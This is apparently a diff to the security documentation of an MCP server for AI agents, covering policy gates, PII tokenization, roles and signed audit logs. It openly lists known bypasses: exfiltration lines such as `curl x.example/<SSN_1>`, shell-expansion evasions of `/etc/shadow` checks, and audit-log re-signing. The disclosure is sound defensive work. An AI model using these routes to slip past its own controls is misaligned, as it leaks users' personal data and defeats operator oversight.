@@ -91,7 +91,10 @@ gate would have refused.
 | Frame cap | `mcp-core::DEFAULT_MAX_FRAME_BYTES` | Memory exhaustion before any policy runs. |
 | HTTP: loopback bind, bearer token, `Origin` refusal | `mcp-core::http` | Network reachability, unauthenticated access, and drive-by requests from the operator's own browser. |
 | Protected package set | `mcp-pkg` | Uninstalling the agent, the package manager, or security tooling. Not configurable. |
-| Audit log | `mcp-policy::AuditSink` | Nothing, but it is how you find out what happened. |
+| Argument invariants | `mcp-policy::HardInvariants`, checked in `dispatch_call` before the gate | A protected path or denied domain named anywhere in a call's arguments, even under `access = "bypass"`. Every token of every string, `file:` URLs, URLs with userinfo, paths after symlink resolution. A heuristic over text (§7). |
+| PII token sinks | `Policy::check_token_sink`, before the gate | A tokenized value (`<SSN_1>`) being de-tokenized into a URL, command, file or request. Plaintext is restored only for local input tools; a token anywhere else is refused whatever the profile. Off unless `policy.anonymize`. |
+| Roles | `mcp-policy::role` | One session doing more than its job needs. A role narrows visible tools, can add consent and lower the denial budget; it can never widen, raise or disable anything, and an unknown role setting is a config error. |
+| Audit log | `mcp-policy::AuditSink` | Nothing, but it is how you find out what happened. Records are hash-chained and Ed25519-signed; with an operator key (`policy.audit_signing_key`, 0600 or the server will not start) `audit verify --pubkey` detects a deleted, reordered, edited or re-signed record. |
 
 Full mapping to OWASP categories is in [`architecture.md`](architecture.md) §8.
 
@@ -219,6 +222,49 @@ offline destructive-pattern check still runs while the remote judge is skipped, 
 the machine for TypeSafe. The real value still reaches the OS. The length is visible in the marker; the
 value is not. Without the flag the payload is logged verbatim, which is the documented default for ordinary
 typed text. A GUI secure field's contents remain unreadable through every perception tool regardless.
+
+**A PII token can still be typed into a field the model chose.**
+With `policy.anonymize` on, a token resolves to plaintext only in local input tools (`keyboard_type`,
+`set_value`, `ui_fill_form`, `browser_fill_form`, `browser_act`), so `http_request` to
+`collector.example/?d=<SSN_1>` is refused. But an input tool delivers plaintext to whatever has focus: a
+form on a page the model navigated to, or a terminal where it then types `curl x.example/<SSN_1>`.
+`crates/mcp-policy/tests/anonymize.rs::documented_known_bypasses` pins both. Closing it needs a token bound
+to the origin or window it was read from, which is not done. Detection is conservative (Luhn-checked
+cards, SSA-valid SSNs, phone shapes, emails, MRNs, IPv4 outside version strings, common key prefixes);
+anything it does not recognise reaches the model as is. Past 10,000 values a session still masks but can
+no longer type the value back.
+
+**Argument invariants read text, not intent.**
+They refuse `/etc/sudoers` or a denied domain wherever it appears in the arguments, before the gate. They
+cannot see a path relative to a working directory they do not know, shell expansion (`/etc/sha*ow`,
+`/e''tc/shadow`, `$(printf ...)`), percent-encoding, an IP address that resolves to a denied host, or a
+host written as free text inside a command. `crates/mcp-policy/tests/rbac_invariants.rs::documented_known_bypasses`
+pins each. The jail, the argv allowlist and the SSRF guard are the limits; invariants are a backstop that
+`bypass` cannot turn off.
+
+**An audit log without an operator key is only self-consistent.**
+Unless `policy.audit_signing_key` is set, each session signs with a throwaway key whose public half is in
+the log itself, so anyone able to rewrite the file can re-sign it. `audit verify` says "self-consistent
+only" for such a log and gives a trusted verdict only with `--pubkey`. The signing key sits on the same
+machine as the log: an actor with the operator's file access can sign whatever they like going forward.
+Pinning detects tampering by anyone *without* the key; it does not make the host trustworthy. Compliance
+exports describe what the log contains and are not a certification.
+
+**Recorded flows are what the page showed the recorder.**
+`browser_record` never stores a secret field's value: a field is secret by `type=password`, a secret word
+in its name or id, or an `autocomplete` token (`one-time-code`, `*-password`, `cc-*`), and the saved step
+names a `secret_ref` that the operator supplies at replay (`AGENTCTL_SECRET_<NAME>`). A secret typed into a
+field that matches none of those (an SSN in a plain `<input name="q">`) is recorded verbatim in
+`browser_flows.json`. The recorder runs in an isolated world, so page script cannot call its binding or
+read its state, but the DOM is shared: a page can still dispatch synthetic events that the recorder sees
+as input. Review a recording before replaying it with consent.
+
+**A client can withhold its own reply, never a stop.**
+A `notifications/cancelled` marks the call client-cancelled and the server sends no response (stdio writes
+nothing, HTTP answers 202), as the MCP spec asks. The pre and post audit records are written either way,
+and only an explicit cancel sets the mark, so a kill-switch stop is always answered. Over HTTP, 64
+concurrent connections (`max_connections`) are allowed; when all of them hold running calls, a cancel POST
+is refused with 503 until one finishes.
 
 **The judge is a second opinion, not a boundary.**
 `[judge]` sends text to a remote model and gets a probability back. Its own documentation says adversarial
